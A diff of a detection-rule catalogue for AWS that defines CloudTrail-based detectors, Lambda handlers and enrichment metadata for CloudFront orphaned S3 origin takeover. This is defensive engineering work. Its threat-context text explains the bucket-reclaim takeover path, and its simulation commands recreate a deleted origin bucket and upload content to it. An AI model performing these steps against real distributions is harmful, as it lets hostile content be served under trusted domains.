+        loggingRequirements: ["The posture workflow must first identify orphaned origins.", "The platform should classify distributions by public exposure and business importance.", "Alias inventories and criticality tags must be refreshed accurately."],
+        limitations: ["Alias names alone are not a perfect proxy for criticality.", "Some internal distributions may still be high impact even without obvious public aliases.", "This rule is downstream of the core orphaned-origin posture control."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "distribution.id", normalizedPath: "aws.cloudfront.distribution.id", notes: "Affected sensitive distribution" },
+          { rawPath: "distribution.aliases", normalizedPath: "url.domain", notes: "Public or customer-facing aliases" },
+          { rawPath: "enrichment.distributionCriticality", normalizedPath: "asset.criticality", notes: "Resolved distribution priority" },
+          { rawPath: "enrichment.bucketExists", normalizedPath: "s3.bucket.exists", notes: "Confirms orphaned-origin state" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["configuration"], type: ["info"], action: "orphaned_cloudfront_origin_prioritized", outcome: "success", provider: "aws" },
+          aws: { cloudfront: { distribution: { id: "E1234" } } },
+          url: { domain: ["www.example.com"] },
+          asset: { criticality: "production_customer_facing" },
+          s3: { bucket: { exists: false } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Distribution Criticality", description: "Classify whether the distribution is production, public, customer-facing, or high-traffic.", examples: ["public website", "internal staging CDN"], falsePositiveReduction: "Prioritizes the most dangerous orphaned origins." },
+        { dimension: "Alias Sensitivity", description: "Evaluate whether alternate domain names map to trusted customer-visible brands or sensitive services.", examples: ["www.example.com", "downloads.example.com"], falsePositiveReduction: "Improves severity assignment for takeover candidates." },
+        { dimension: "Business Impact Context", description: "Determine the operational and reputational consequences if the distribution served hostile content.", examples: ["customer login flow", "marketing assets"], falsePositiveReduction: "Supports remediation ordering and executive risk communication." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should take the orphaned-origin posture results and elevate the subset affecting public or otherwise sensitive distributions. It is a prioritization layer on top of the core orphaned-origin detection.",
+        conditions: ["distribution is already identified as having an orphaned S3 origin", "distribution criticality or public exposure metadata places it in a sensitive or customer-facing class"],
+        tuningGuidance: "1. Build on top of the core orphaned-origin posture check. 2. Use explicit distribution criticality metadata where possible. 3. Escalate highest for public, branded, or business-critical aliases.",
+        whenToFire: "Fire when an orphaned CloudFront origin affects a sensitive or public distribution.",
+      },
+      simulationCommand: "aws cloudfront get-distribution --id E1234",
+      quality: {
+        signalQuality: 10,
+        falsePositiveRate: "Low with accurate criticality classification",
+        expectedVolume: "Extremely low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["Scheduled posture prioritization workflows", "Athena or data-lake post-processing", "Lambda enrichment on posture findings"],
+        scheduling: "Run alongside or immediately after the core orphaned-origin posture check.",
+        considerations: ["This is the severity-prioritization branch of the orphaned-origin family.", "Distribution criticality metadata is the main dependency."],
+      },
+    },
   },
   {
     id: "det-139",
     title: "Bucket Recreated Matching Former CloudFront Origin Name",
-    description: "Detect possible takeover if bucket name reuse is visible. CreateBucket for a bucket name that matches a previously deleted bucket still referenced by CloudFront. Most applicable where org-wide logging or external monitoring can observe recreation.",
+    description: "Detects bucket-name reuse that matches a previously orphaned CloudFront S3 origin. This is the strongest local control-plane signal that the takeover path may now be actively materializing.",
     awsService: "S3",
     relatedServices: ["CloudFront"],
     severity: "Critical",
@@ -14613,16 +18134,96 @@ ORDER BY eventTime DESC
 | filter eventName = "CreateBucket"
 | sort @timestamp desc`,
       eventbridge: JSON.stringify({ source: ["aws.s3"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["s3.amazonaws.com"], eventName: ["CreateBucket"] } }, null, 2),
+      lambda: `"""
+Bucket Recreated Matching Former CloudFront Origin Name
+Trigger: EventBridge rule matching CreateBucket.
+Use for: Detecting reuse of bucket names tied to orphaned CloudFront origins.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "s3.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") != "CreateBucket":
+        return {"matched": False}
+
+    return {
+        "matched": "requires-orphaned-origin-bucket-name-baseline-check",
+        "alert": {
+            "rule_id": "det-139",
+            "title": "Bucket Recreated Matching Former CloudFront Origin Name",
+            "severity": "Critical",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "bucket_name": detail.get("requestParameters", {}).get("bucketName"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "s3.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.bucketName", "recipientAccountId", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "s3.amazonaws.com", eventName: "CreateBucket", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::999999999999:user/attacker" }, requestParameters: { bucketName: "deleted-victim-bucket" }, recipientAccountId: "999999999999", sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify the recreated bucket name.", "Check if it matches a deleted CloudFront origin.", "Verify if recreation was in different account."],
-    testingSteps: ["Create bucket with name of previously deleted CloudFront origin.", "Verify detection with baseline."],
+    investigationSteps: ["Identify the recreated bucket name and check whether it matches a bucket previously deleted while still referenced by CloudFront.", "Determine whether the bucket was recreated by the expected owner or by a different account or unexpected principal.", "Immediately validate whether any CloudFront distribution still points at that bucket name and whether hostile content may now be reachable."],
+    testingSteps: ["Create a lab bucket using the name of a previously deleted CloudFront-origin bucket tracked in your baseline.", "Verify CloudTrail records `CreateBucket` and the enrichment matches the name against the orphaned-origin baseline.", "Run the detector and confirm it only fires for tracked high-risk reused names."],
+    lifecycle: {
+      whyItMatters: "Name reuse is the clearest control-plane signal that an orphaned origin may be moving from posture risk into active takeover. Once the bucket name is reclaimed, the distribution may again resolve to live content.",
+      threatContext: {
+        attackerBehavior: "An attacker may claim a bucket name that was previously orphaned from a CloudFront distribution to serve content through the trusted edge path.",
+        realWorldUsage: "This typically appears after stale-origin conditions are left unresolved and the bucket namespace becomes available again.",
+        whyItMatters: "Unlike precursor deletion or posture-only checks, this event suggests the missing origin name has been claimed and may now be operational.",
+        riskAndImpact: "If missed, defenders may lose the narrow window before the reclaimed bucket starts serving attacker-controlled objects behind CloudFront.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail for CreateBucket", "Baseline of deleted buckets that were still referenced by CloudFront origins"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.arn", "requestParameters.bucketName", "recipientAccountId", "sourceIPAddress"],
+        loggingRequirements: ["CreateBucket events must be ingested centrally where possible.", "The platform must maintain a baseline of risky bucket names derived from orphaned-origin detections or precursor deletions.", "Cross-account visibility improves fidelity when reuse happens outside the originally affected account."],
+        limitations: ["Detection quality depends on maintaining a good orphaned-origin name baseline.", "Org-local visibility may miss name reuse in external accounts.", "Same-owner recreation during remediation can appear similar to takeover unless ownership context is checked."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "requestParameters.bucketName", normalizedPath: "s3.bucket.name", notes: "Recreated bucket name" },
+          { rawPath: "recipientAccountId", normalizedPath: "cloud.account.id", notes: "Account recreating the bucket" },
+          { rawPath: "enrichment.orphanedOriginMatch", normalizedPath: "aws.cloudfront.origin.orphaned_name_match", notes: "Whether name matches risky orphaned-origin baseline" },
+          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor creating the bucket" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["storage"], type: ["creation"], action: "CreateBucket", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:iam::999999999999:user/attacker", type: "IAMUser" },
+          cloud: { account: { id: "999999999999" } },
+          s3: { bucket: { name: "deleted-victim-bucket" } },
+          aws: { cloudfront: { origin: { orphaned_name_match: true } } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Orphaned-Origin Name Baseline", description: "Track bucket names that were deleted while still referenced by CloudFront distributions.", examples: ["deleted-victim-bucket"], falsePositiveReduction: "Focuses attention on high-risk name reuse only." },
+        { dimension: "Recreation Ownership", description: "Determine whether the recreating account is the expected owner or an unexpected account.", examples: ["same remediation account", "different external account"], falsePositiveReduction: "Separates benign restoration from possible takeover." },
+        { dimension: "Distribution Exposure", description: "Identify whether the reclaimed bucket name still maps to public or sensitive distributions.", examples: ["customer-facing distribution", "low-risk internal distribution"], falsePositiveReduction: "Improves severity and response ordering." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should detect `CreateBucket` when the created bucket name matches a previously orphaned CloudFront origin name. It is the name-reuse detector for the orphaned-origin family.",
+        conditions: ["eventSource equals s3.amazonaws.com", "eventName equals CreateBucket", "created bucket name matches the baseline of orphaned or deleted CloudFront-origin bucket names"],
+        tuningGuidance: "1. Maintain the risky-name baseline carefully. 2. Check recreating account ownership immediately. 3. Escalate strongest when the name still maps to a public or sensitive distribution.",
+        whenToFire: "Fire when a bucket is created using a name associated with a known orphaned CloudFront origin.",
+      },
+      simulationCommand: "aws s3api create-bucket --bucket deleted-victim-bucket --region us-east-1",
+      quality: {
+        signalQuality: 9,
+        falsePositiveRate: "Low-Medium with ownership validation and good risky-name baselines",
+        expectedVolume: "Extremely low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["EventBridge + Lambda enrichment", "Athena with orphaned-name baselines", "Splunk", "Panther / Chronicle / Datadog"],
+        scheduling: "Real-time is preferred because name reuse may quickly turn into active content takeover.",
+        considerations: ["This is the name-reuse branch of the orphaned-origin family.", "Risky-name baselines and ownership validation are the main dependencies."],
+      },
+    },
   },
   {
     id: "det-140",
-    title: "Orphaned Origin Followed by CloudFront or S3 Access Anomaly",
-    description: "High-confidence takeover signal: orphaned origin state then unusual CloudFront content behavior, origin errors changing to successful fetches, or new bucket activity tied to the reused bucket name.",
+    title: "Orphaned Origin Followed by Bucket Reuse and Content Activity",
+    description: "High-confidence CloudFront orphaned-origin takeover chain. This should correlate orphaned-origin state or risky bucket-name reuse with later object writes or activation on the reclaimed bucket using ordered lineage.",
     awsService: "CloudFront",
     relatedServices: ["S3"],
     severity: "Critical",
@@ -14641,9 +18242,9 @@ detection:
   selection_put:
     eventSource: s3.amazonaws.com
     eventName: PutObject
-  condition: 1 of selection_*
+  condition: selection_create
 level: critical
-# Full correlation: CreateBucket (matching orphaned origin name) + PutObject to same bucket within 1h.`,
+# Full correlation requires bucket-name lineage to a known orphaned CloudFront origin plus ordered content activity.`,
       splunk: `index=aws sourcetype=aws:cloudtrail eventSource=s3.amazonaws.com (eventName=CreateBucket OR eventName=PutObject)
 | eval bucket=requestParameters.bucketName
 | eval actor=coalesce(userIdentity.arn, userIdentity.accountId)
@@ -14677,11 +18278,91 @@ ORDER BY c.create_time DESC`,
 | filter cnt >= 2
 | sort cnt desc`,
       eventbridge: JSON.stringify({ source: ["aws.s3"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["s3.amazonaws.com"], eventName: ["CreateBucket", "PutObject"] } }, null, 2),
+      lambda: `"""
+Orphaned Origin Followed by Bucket Reuse and Content Activity
+Trigger: EventBridge rule matching CreateBucket or PutObject.
+Use for: Correlation from orphaned-origin bucket reuse into content activation.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "s3.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") not in {"CreateBucket", "PutObject"}:
+        return {"matched": False}
+
+    return {
+        "matched": "requires-orphaned-origin-reuse-plus-content-correlation",
+        "alert": {
+            "rule_id": "det-140",
+            "title": "Orphaned Origin Followed by Bucket Reuse and Content Activity",
+            "severity": "Critical",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "bucket_name": detail.get("requestParameters", {}).get("bucketName"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "s3.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.bucketName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "s3.amazonaws.com", eventName: "CreateBucket", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::999999999999:user/attacker" }, requestParameters: { bucketName: "deleted-victim-bucket" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify CreateBucket and PutObject sequence.", "Verify if bucket name matches orphaned CloudFront origin.", "Check for malicious content in PutObject."],
-    testingSteps: ["Create bucket matching orphaned origin, then PutObject within 1h.", "Run Splunk or Athena correlation query."],
+    investigationSteps: ["Confirm the bucket name is tied to a known orphaned CloudFront origin and that it was newly created or reactivated.", "Identify the ordered sequence of `CreateBucket` followed by `PutObject` or similar activation activity on that bucket.", "Assess whether the written content would be served through CloudFront and whether hostile or branded-content takeover is now possible."],
+    testingSteps: ["Create a lab bucket using a tracked orphaned-origin name and then upload content with `PutObject` within one hour.", "Verify both the bucket creation and later object activity appear in CloudTrail with the same bucket lineage.", "Run the detector and confirm it requires both risky name reuse and later content activity."],
+    lifecycle: {
+      whyItMatters: "This is the strongest takeover sequence in the family: an orphaned origin name is reclaimed and then content is uploaded, suggesting the bucket is being prepared for live distribution through CloudFront.",
+      threatContext: {
+        attackerBehavior: "An attacker may create a bucket using an orphaned origin name and then upload malicious or deceptive content intended to be served through the trusted distribution.",
+        realWorldUsage: "The takeover path becomes much more credible once the reclaimed bucket is no longer empty and starts receiving objects.",
+        whyItMatters: "The ordered chain from risky name reuse to content activity is far stronger than posture state or bucket creation alone.",
+        riskAndImpact: "If missed, defenders may not intervene before hostile content becomes available behind a trusted CloudFront edge path.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail for S3 CreateBucket and PutObject", "Baseline of orphaned-origin bucket names", "Optional CloudFront access or health telemetry"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.arn", "requestParameters.bucketName", "requestParameters.key"],
+        loggingRequirements: ["CreateBucket and PutObject events must be ingested into the same analytics environment.", "The platform must retain bucket-name lineage to known orphaned CloudFront origins.", "The engine must support ordered time-window correlation."],
+        limitations: ["Object uploads alone do not prove CloudFront served the content yet.", "Same-owner remediation workflows can look similar unless ownership and remediation context are known.", "If only CloudFront-facing effects are visible, additional telemetry may be required for full confirmation."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "requestParameters.bucketName", normalizedPath: "s3.bucket.name", notes: "Reclaimed bucket name tied to orphaned origin" },
+          { rawPath: "requestParameters.key", normalizedPath: "file.path", notes: "Object uploaded after bucket reuse" },
+          { rawPath: "enrichment.orphanedOriginMatch", normalizedPath: "aws.cloudfront.origin.orphaned_name_match", notes: "Links bucket to known orphaned origin" },
+          { rawPath: "eventName", normalizedPath: "event.action", notes: "CreateBucket then PutObject sequence" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["storage"], type: ["creation"], action: "CreateBucket", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:iam::999999999999:user/attacker", type: "IAMUser" },
+          s3: { bucket: { name: "deleted-victim-bucket" } },
+          aws: { cloudfront: { origin: { orphaned_name_match: true } } },
+          related: { event: { action: "PutObject" } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Orphaned-Origin Bucket Lineage", description: "Verify the bucket name belongs to a known orphaned CloudFront origin path.", examples: ["tracked from det-137", "tracked from det-136 + inventory"], falsePositiveReduction: "Prevents unrelated bucket creation and object writes from matching." },
+        { dimension: "Ownership and Remediation Context", description: "Determine whether the bucket creation is expected remediation or an unexpected claimant.", examples: ["same owner remediation", "unexpected external account"], falsePositiveReduction: "Separates defensive recovery from potential takeover." },
+        { dimension: "Content Activation Risk", description: "Assess whether uploaded objects are likely to become web-served content through the affected distribution.", examples: ["index.html uploaded", "benign placeholder object"], falsePositiveReduction: "Improves confidence that the chain reflects actual takeover preparation." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should model a takeover-preparation chain: a bucket name tied to a known orphaned CloudFront origin is created or reused, and then content is uploaded to that bucket soon afterward. It should require ordered bucket lineage and later content activity.",
+        conditions: ["bucket creation or reuse matches a known orphaned CloudFront origin name", "later PutObject activity occurs on the same bucket within 1 hour", "ownership or remediation context does not explain the sequence benignly"],
+        tuningGuidance: "1. Require lineage to a known orphaned origin name. 2. Require order from bucket activation into object upload. 3. Escalate strongest when the affected distribution is public or the content appears web-served.",
+        whenToFire: "Fire when a reclaimed orphaned-origin bucket is followed quickly by content activity that suggests activation.",
+      },
+      simulationCommand: "aws s3api create-bucket --bucket deleted-victim-bucket --region us-east-1 && aws s3api put-object --bucket deleted-victim-bucket --key index.html --body index.html",
+      quality: {
+        signalQuality: 10,
+        falsePositiveRate: "Low-Medium with ownership context and orphaned-origin lineage",
+        expectedVolume: "Extremely low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["SIEM correlation engines", "Athena with orphaned-name baselines", "Panther / Chronicle / Datadog", "EventBridge + Lambda with temporary state"],
+        scheduling: "Near-real-time is preferred because reclaimed buckets may be activated quickly.",
+        considerations: ["This is the highest-fidelity takeover chain in the orphaned-origin family.", "Bucket-name lineage and ownership context are the main dependencies."],
+      },
+    },
   },
 ];
 
